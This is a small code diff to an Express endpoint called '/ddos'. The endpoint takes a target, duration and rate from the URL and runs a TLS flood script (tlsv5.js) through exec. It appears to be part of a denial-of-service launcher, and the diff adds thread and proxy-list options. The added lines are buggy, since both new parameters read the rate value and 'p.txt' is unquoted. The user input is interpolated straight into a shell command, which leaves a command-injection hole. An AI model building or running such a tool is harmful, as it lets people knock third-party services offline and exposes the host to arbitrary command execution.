@@ -7,8 +7,10 @@ app.get('/ddos', (req, res) => {
   const target = req.query.target || 'example.com';
   const duration = req.query.duration || 10;
   const rate = req.query.rate || 100;
+  const thread = req.query.rate || 25;
+  const proxy =req.query.rate || p.txt;
 
-  const command = `node tlsv5.js ${target} ${duration} ${rate} 25 p.txt`;
+  const command = `node tlsv5.js ${target} ${duration} ${rate} ${thread} ${proxy}`;
 
   exec(command, (error, stdout, stderr) => {
     if (error) {
